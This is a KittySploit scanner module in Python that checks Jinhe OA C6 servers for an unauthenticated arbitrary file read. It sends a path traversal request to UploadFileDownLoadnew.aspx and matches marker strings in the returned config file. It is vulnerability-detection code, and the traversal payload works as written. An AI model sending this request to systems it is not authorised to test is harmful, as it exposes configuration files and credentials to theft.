#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read Detection',
        'description': 'There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in Extremely unsafe state.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'jinhe-oa-c6', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('MaxFolderTotal=1', '[JHFile]', 'FolderTotal=1',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read detected",
                path='/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini',
            )
            return True
        return False

